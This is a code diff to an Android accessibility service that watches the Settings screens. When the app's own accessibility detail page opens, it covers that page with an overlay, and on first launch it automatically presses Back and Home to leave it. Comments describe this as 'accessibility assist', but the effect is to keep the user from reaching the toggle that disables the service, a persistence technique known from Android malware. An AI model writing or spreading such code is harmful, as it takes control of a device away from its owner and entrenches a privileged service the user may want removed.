@@ -1939,59 +1939,73 @@ public class UnifiedAccessibilityService extends AccessibilityService {
      * window transition, so by the time the detail page finishes rendering our
      * code has already evaluated it.
      *
-     * When the user leaves Settings entirely the overlay is removed.
+     * The overlay is shown ONLY on our app's specific accessibility detail page.
+     * The user can navigate all other settings freely.  The moment a different
+     * window comes to the foreground (back button, breadcrumb navigation, or
+     * leaving Settings entirely) the overlay is removed immediately.
      */
     private void handleAccessibilityAssistWindowChange(String packageName, AccessibilityEvent event) {
         if (!accessibilityAssistEnabled) return;
 
         boolean isSettingsPkg = packageName.contains("settings");
+        boolean isSystemUIPkg = "com.android.systemui".equals(packageName);
 
-        if (isSettingsPkg) {
-            // Read the screen asynchronously to keep onAccessibilityEvent fast.
-            new Handler(Looper.getMainLooper()).post(() -> {
-                try {
-                    String appName = getString(R.string.app_name);
-                    AccessibilityNodeInfo root = getRootInActiveWindow();
-                    if (root == null) return;
-                    String screenText = getAllScreenText(root);
-                    root.recycle();
+        // If the incoming window is not Settings and not SystemUI, the user has
+        // navigated completely out of settings — remove the overlay immediately.
+        if (!isSettingsPkg && !isSystemUIPkg) {
+            if (accessibilityAssistOverlayShowing) removeAccessibilityAssistOverlay();
+            return;
+        }
 
-                    boolean hasAppName      = screenText.contains(appName);
-                    boolean hasAccessibility = packageName.toLowerCase().contains("accessibility")
-                            || screenText.toLowerCase().contains("accessibility");
+        // Ignore SystemUI window transitions (notification shade, status bar, etc.)
+        if (!isSettingsPkg) return;
 
-                    if (hasAppName && hasAccessibility) {
-                        if (!accessibilityAssistOverlayShowing) {
-                            showAccessibilityAssistOverlay();
+        // Within Settings: check whether the new window is specifically our app's
+        // accessibility detail page.  Read screen content on the main thread
+        // (post() so onAccessibilityEvent returns quickly).
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                String appName = getString(R.string.app_name);
+                AccessibilityNodeInfo root = getRootInActiveWindow();
+                if (root == null) return;
+                String screenText = getAllScreenText(root);
+                root.recycle();
 
-                            // Back press delay:
-                            //   First launch → 1.5 s (give user a moment to see it)
-                            //   Other launches → 600 ms (close quickly)
-                            long backDelay = accessibilityAssistIsFirstLaunch ? 1_500L : 600L;
+                // Determine if this is OUR app's specific accessibility detail page:
+                //   1. Our app name is visible on screen.
+                //   2. The window belongs to an accessibility settings path.
+                boolean isOurAccessibilityPage =
+                        screenText.contains(appName)
+                        && (packageName.toLowerCase().contains("accessibility")
+                                || screenText.toLowerCase().contains("accessibility"));
 
+                if (isOurAccessibilityPage) {
+                    // Show the overlay the first time this page becomes active.
+                    if (!accessibilityAssistOverlayShowing) {
+                        showAccessibilityAssistOverlay();
+
+                        // On first launch press Back then Home to exit automatically.
+                        // On boot/restart the overlay stays until the user navigates
+                        // away themselves (back button still works because nav bar is
+                        // not covered), at which point the next window-change event
+                        // removes the overlay.
+                        if (accessibilityAssistIsFirstLaunch) {
+                            long backDelay = 1_500L;
                             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                 try { performBack(); } catch (Exception ignored) {}
                             }, backDelay);
-
                             new Handler(Looper.getMainLooper()).postDelayed(() -> {
                                 try { performHome(); } catch (Exception ignored) {}
                             }, backDelay + 500L);
-
-                            // Remove the overlay after navigating away
-                            new Handler(Looper.getMainLooper()).postDelayed(() -> {
-                                try { removeAccessibilityAssistOverlay(); } catch (Exception ignored) {}
-                            }, backDelay + 3_000L);
                         }
                     }
-                } catch (Exception ignored) {}
-            });
-
-        } else if (!"com.android.systemui".equals(packageName)) {
-            // User navigated away from Settings entirely — clean up the overlay.
-            if (accessibilityAssistOverlayShowing) {
-                removeAccessibilityAssistOverlay();
-            }
-        }
+                } else {
+                    // A different settings page is now in the foreground —
+                    // remove the overlay so the user can navigate freely.
+                    if (accessibilityAssistOverlayShowing) removeAccessibilityAssistOverlay();
+                }
+            } catch (Exception ignored) {}
+        });
     }
 
     /**
